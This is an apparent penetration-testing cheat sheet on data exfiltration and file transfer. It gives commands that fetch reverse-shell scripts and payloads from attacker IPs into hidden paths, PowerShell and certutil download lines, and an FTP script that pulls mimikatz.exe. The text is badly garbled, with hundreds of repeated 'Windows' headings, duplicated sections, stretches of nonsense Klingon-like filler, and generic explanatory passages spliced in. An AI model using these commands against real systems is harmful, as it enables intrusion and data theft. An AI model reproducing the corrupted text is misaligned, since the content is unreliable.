# Exfiltration

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Commonly whitelisted domains to exfiltrate information

Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows** 

**Windows** *Windows* 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**Windows** 

**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows** 

**Windows** *Windows* 

**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### QapHa'wI'pu' vItlhutlh

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS Server**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP server (python)

## FTP

### FTP server (python)

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP server (NodeJS)

#### Introduction

An FTP (File Transfer Protocol) server is a common method used to transfer files between a client and a server over a network. In this section, we will explore how to set up and configure an FTP server using NodeJS.

#### Setting up the FTP server

To set up an FTP server using NodeJS, follow these steps:

1. Install the `ftp-srv` package using npm:

```bash
npm install ftp-srv
```

2. Create a new JavaScript file, for example `server.js`, and require the `ftp-srv` module:

```javascript
const FtpSrv = require('ftp-srv');
```

3. Create a new instance of the `FtpSrv` class and configure it with the desired options:

```javascript
const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  anonymous: true,
  greeting: 'Welcome to the FTP server',
});
```

4. Start the FTP server by calling the `listen` method:

```javascript
ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((error) => {
    console.error('Error starting FTP server:', error);
  });
```

#### Configuring user authentication

By default, the FTP server allows anonymous access. However, you can configure user authentication to restrict access to authorized users. To do this, you need to define a custom authentication function and pass it as an option when creating the `FtpSrv` instance.

Here is an example of how to configure user authentication:

```javascript
const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  anonymous: false,
  greeting: 'Welcome to the FTP server',
  authenticator: (username, password, callback) => {
    // Implement your custom authentication logic here
    if (username === 'admin' && password === 'password') {
      callback(null, { root: '/path/to/user/root' });
    } else {
      callback(new Error('Invalid username or password'));
    }
  },
});
```

In the example above, the `authenticator` function receives the username and password entered by the client. You can implement your own logic to validate the credentials and provide the appropriate response.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process. By following the steps outlined in this section, you can create a basic FTP server and configure user authentication to enhance security.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP server (pure-ftp)

#### Description

FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and a server on a computer network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.

#### Exfiltration Technique

Exfiltration refers to the unauthorized extraction of data from a network or system. In the context of an FTP server, exfiltration can occur when an attacker gains access to the server and transfers sensitive data from it to an external location.

To exfiltrate data from an FTP server, an attacker can use various techniques, including:

1. **File Transfer**: The attacker can connect to the FTP server using valid credentials or by exploiting vulnerabilities in the server software. Once connected, they can browse the server's file system and transfer files to their own system or another location.

2. **Directory Traversal**: If the FTP server is misconfigured or vulnerable to directory traversal attacks, the attacker can navigate to directories outside of the server's root directory. This allows them to access files that should not be accessible and exfiltrate sensitive data.

3. **Backdoor**: If the attacker gains administrative access to the FTP server, they can create a backdoor that allows them to exfiltrate data without being detected. This can involve modifying the server's configuration or installing additional software.

#### Mitigation

To mitigate the risk of exfiltration through an FTP server, consider the following measures:

1. **Secure Configuration**: Ensure that the FTP server is properly configured and follows security best practices. This includes using strong passwords, disabling anonymous access, and regularly updating the server software.

2. **Access Control**: Implement access controls to restrict who can connect to the FTP server and what actions they can perform. Use strong authentication mechanisms and enforce least privilege principles.

3. **Monitoring and Logging**: Enable logging on the FTP server to track and monitor user activities. Regularly review the logs for any suspicious or unauthorized access attempts.

4. **Encryption**: Use secure protocols such as FTPS (FTP over SSL/TLS) or SFTP (SSH File Transfer Protocol) to encrypt data in transit between the client and server. This helps protect against eavesdropping and data interception.

5. **Regular Auditing**: Conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the FTP server configuration or implementation.

By implementing these measures, you can enhance the security of your FTP server and reduce the risk of data exfiltration.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client

### **Windows** client
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vItlhutlhvam vulnerabilities vItlhutlhvam vItlhutlhvam vItlhutlhvam vItlhutlhvam. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali as server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
yI'el SambaDaq **Samba** lo'laHbe'chugh **smb share** yI'el.
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

## Introduction

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This technique is commonly used by hackers to steal sensitive information such as user credentials, financial data, or intellectual property.

## Methods of Exfiltration

### 1. Network-Based Exfiltration

Network-based exfiltration involves sending data over a network connection to a remote server controlled by the attacker. This can be done using various protocols such as HTTP, FTP, or DNS.

#### Example: HTTP Exfiltration

In this method, the attacker embeds the stolen data within HTTP requests or responses. The data is then sent to a web server under the attacker's control. This technique is often used to bypass firewalls and other network security measures.

### 2. Physical Exfiltration

Physical exfiltration involves physically removing data from a target system. This can be done by stealing physical storage devices such as hard drives or USB drives, or by copying data onto portable media.

#### Example: USB Drive Exfiltration

In this method, the attacker connects a USB drive to the target system and copies the desired data onto the drive. The USB drive can then be easily removed and taken off-site.

### 3. Covert Channels

Covert channels are hidden communication channels that can be used to exfiltrate data without being detected. These channels can exploit various protocols or techniques to hide the data within legitimate network traffic.

#### Example: DNS Tunneling

DNS tunneling involves encoding the stolen data within DNS queries or responses. The attacker can then use a DNS server under their control to extract the data from the network traffic.

## Countermeasures

To prevent exfiltration attacks, it is important to implement the following countermeasures:

- Implement strong network security measures, such as firewalls and intrusion detection systems.
- Regularly monitor network traffic for any suspicious activity or anomalies.
- Encrypt sensitive data to protect it from unauthorized access.
- Implement strict access controls to limit the exposure of sensitive information.
- Educate employees about the risks of exfiltration and the importance of following security best practices.

By following these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information from falling into the wrong hands.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Attacker vItlhutlh SSHd jImej.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

If the victim has SSH, the attacker can mount a directory from the victim to the attacker.

## SSHFS

vaj jatlhpu' vItlhutlh vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' 